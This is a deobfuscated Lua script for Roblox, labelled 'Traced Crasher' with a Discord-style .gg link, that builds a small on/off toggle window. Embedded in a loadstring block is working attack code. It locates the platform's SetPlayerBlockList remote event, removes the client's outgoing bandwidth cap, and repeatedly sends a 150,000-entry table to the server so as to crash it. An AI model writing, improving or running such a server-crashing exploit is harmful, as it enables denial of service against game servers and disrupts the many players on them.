--Deobfuscated by a1

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
game:GetService("TweenService")
local RunService = game:GetService("RunService")
local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")

local tbl = {
	bg = Color3.fromRGB(14, 14, 16),
	surface = Color3.fromRGB(22, 22, 26),
	disabled = Color3.fromRGB(38, 38, 44),
	border = Color3.fromRGB(60, 60, 68),
	accent = Color3.fromRGB(230, 35, 35),
	accentDark = Color3.fromRGB(170, 22, 22),
	accentBright = Color3.fromRGB(255, 70, 70),
	crimson = Color3.fromRGB(110, 15, 15),
	text = Color3.fromRGB(238, 238, 242),
	white = Color3.fromRGB(255, 255, 255),
	black = Color3.fromRGB(0, 0, 0),
}

local gothamBlack = Enum.Font.GothamBlack

local thread = coroutine.create(function()
	local chunk = loadstring([[local RunService = game:GetService("RunService")

local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false

local state = {
    running = false,
    thread  = nil,
    remote  = nil,
    cache   = nil,
    pad     = "",
}

local function resolve()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

state.remote = resolve()

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""

local function build()
    local root = table.create(Children)
    for i = 1, Children do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload
    if RebuildEach or not state.cache then
        payload = build()
        if not RebuildEach then state.cache = payload end
    else
        payload = state.cache
    end
    for _ = 1, FireBurst do
        state.remote:FireServer(payload)
    end
end

local function start()
    if state.running then return end
    state.running = true
    state.cache = nil
    state.thread = task.spawn(function()
        while state.running do
            pcall(fire)
            if FrameDelay > 0 then
                task.wait(FrameDelay)
            else
                RunService.Heartbeat:Wait()
            end
        end
    end)
end

local function stop()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
end

return {
    start  = start,
    stop   = stop,
    toggle = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
}
]])

	if not chunk then
		return
	end
	local ok, alt = pcall(chunk)

	if ok then
		if type(alt) == "table" then
			_G.__ALT = alt
		end
	end
end)

coroutine.resume(thread)
local alt = _G.__ALT
_G.__ALT = nil
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLoseUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 210, 0, 92)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = tbl.bg
frame.BorderSizePixel = 0
frame.ClipsDescendants = false
frame.Parent = screenGui
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = frame
local uiGradient = Instance.new("UIGradient")
uiGradient.Color = ColorSequence.new(tbl.bg, Color3.fromRGB(22, 14, 14))
uiGradient.Rotation = 135
uiGradient.Parent = frame
local frame2 = Instance.new("Frame")
frame2.Name = "BorderFrame"
frame2.Size = UDim2.new(1, 2, 1, 2)
frame2.Position = UDim2.new(0.5, 0, 0.5, 0)
frame2.AnchorPoint = Vector2.new(0.5, 0.5)
frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame2.BorderSizePixel = 0
frame2.ZIndex = 0
frame2.Parent = frame
local uiCorner2 = Instance.new("UICorner")
uiCorner2.CornerRadius = UDim.new(0, 11)
uiCorner2.Parent = frame2
local uiGradient2 = Instance.new("UIGradient")
local colorSequence = ColorSequence.new
local tbl2 = {}
local v = ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 5, 5))
local v2 = ColorSequenceKeypoint.new(0.25, Color3.fromRGB(180, 20, 20))
local v3 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 90, 90))
local v4 = ColorSequenceKeypoint.new(0.75, Color3.fromRGB(180, 20, 20))
local new = ColorSequenceKeypoint.new
local color = Color3.fromRGB
tbl2[1] = v
tbl2[2] = v2
tbl2[3] = v3
tbl2[4] = v4

do
	local values = table.pack(new(1, color(40, 5, 5)))
	table.move(values, 1, values.n, 5, tbl2)
end

uiGradient2.Color = colorSequence(tbl2)
uiGradient2.Rotation = 0
uiGradient2.Parent = frame2
local frame3 = Instance.new("Frame")
frame3.Name = "InnerMask"
frame3.Size = UDim2.new(1, -2, 1, -2)
frame3.Position = UDim2.new(0.5, 0, 0.5, 0)
frame3.AnchorPoint = Vector2.new(0.5, 0.5)
frame3.BackgroundColor3 = tbl.bg
frame3.BorderSizePixel = 0
frame3.ZIndex = 1
frame3.Parent = frame
local uiCorner3 = Instance.new("UICorner")
uiCorner3.CornerRadius = UDim.new(0, 9)
uiCorner3.Parent = frame3
local uiGradient3 = Instance.new("UIGradient")
uiGradient3.Color = ColorSequence.new(tbl.bg, Color3.fromRGB(22, 14, 14))
uiGradient3.Rotation = 135
uiGradient3.Parent = frame3
local textLabel = Instance.new("TextLabel")
textLabel.Name = "Title"
textLabel.Size = UDim2.new(1, 0, 0, 34)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.BackgroundTransparency = 1
textLabel.Font = gothamBlack
textLabel.Text = "Traced Crasher .gg/traced"
textLabel.TextColor3 = tbl.text
textLabel.TextSize = 14
textLabel.TextXAlignment = Enum.TextXAlignment.Center
textLabel.ZIndex = 3
textLabel.Parent = frame
local textButton = Instance.new("TextButton")
textButton.Name = "Toggle"
textButton.Size = UDim2.new(1, -20, 0, 38)
textButton.Position = UDim2.new(0, 10, 0, 44)
textButton.BackgroundColor3 = tbl.disabled
textButton.BorderSizePixel = 0
textButton.Font = gothamBlack
textButton.Text = ""
textButton.TextTransparency = 1
textButton.AutoButtonColor = false
textButton.ZIndex = 3
textButton.Parent = frame
local uiCorner4 = Instance.new("UICorner")
uiCorner4.CornerRadius = UDim.new(0, 8)
uiCorner4.Parent = textButton
local uiGradient4 = Instance.new("UIGradient")
uiGradient4.Color = ColorSequence.new(tbl.disabled, Color3.fromRGB(48, 48, 54))
uiGradient4.Rotation = 135
uiGradient4.Parent = textButton
local uiStroke = Instance.new("UIStroke")
uiStroke.Color = tbl.crimson
uiStroke.Thickness = 1.66
uiStroke.Transparency = 0
uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
uiStroke.Parent = textButton
local textLabel2 = Instance.new("TextLabel")
textLabel2.Name = "Label"
textLabel2.Size = UDim2.new(1, 0, 1, 0)
textLabel2.Position = UDim2.new(0, 0, 0, 0)
textLabel2.BackgroundTransparency = 1
textLabel2.Font = gothamBlack
textLabel2.Text = "DISABLED"
textLabel2.TextColor3 = tbl.white
textLabel2.TextTransparency = 0
textLabel2.TextSize = 14
textLabel2.TextXAlignment = Enum.TextXAlignment.Center
textLabel2.TextYAlignment = Enum.TextYAlignment.Center
textLabel2.ZIndex = 5
textLabel2.Active = false
textLabel2.Parent = textButton
local flag = false

RunService.RenderStepped:Connect(function(deltaTime)
	local n = flag

	if n then
		n = 160
	end

	uiGradient2.Rotation = (uiGradient2.Rotation + (n or 60) * deltaTime) % 360
end)

local function fn(arg)
	flag = arg

	if arg then
		textButton.BackgroundColor3 = tbl.accentBright
		uiGradient4.Color = ColorSequence.new(tbl.accent, tbl.accentBright)
		uiGradient4.Rotation = 0
		uiStroke.Color = tbl.accentBright
		textLabel2.Text = "ENABLED"
		textLabel2.TextColor3 = tbl.black

		if alt then
			if alt.start then
				pcall(alt.start)
			end
		end
	else
		textButton.BackgroundColor3 = tbl.disabled
		uiGradient4.Color = ColorSequence.new(tbl.disabled, Color3.fromRGB(48, 48, 54))
		uiGradient4.Rotation = 135
		uiStroke.Color = tbl.crimson
		textLabel2.Text = "DISABLED"
		textLabel2.TextColor3 = tbl.white

		if alt then
			if alt.stop then
				pcall(alt.stop)
			end
		end
	end
end

textButton.MouseButton1Click:Connect(function()
	fn(not flag)
end)

local flag2 = false
local position = nil
local position2 = nil

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		flag2 = true
		position = input.Position
		position2 = frame.Position
	elseif input.UserInputType == Enum.UserInputType.Touch then
		flag2 = true
		position = input.Position
		position2 = frame.Position
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if flag2 then
		local n

		if input.UserInputType == Enum.UserInputType.MouseMovement then
			n = input.Position - position
			frame.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
		elseif input.UserInputType == Enum.UserInputType.Touch then
			n = input.Position - position
			frame.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		flag2 = false
	elseif input.UserInputType == Enum.UserInputType.Touch then
		flag2 = false
	end
end)
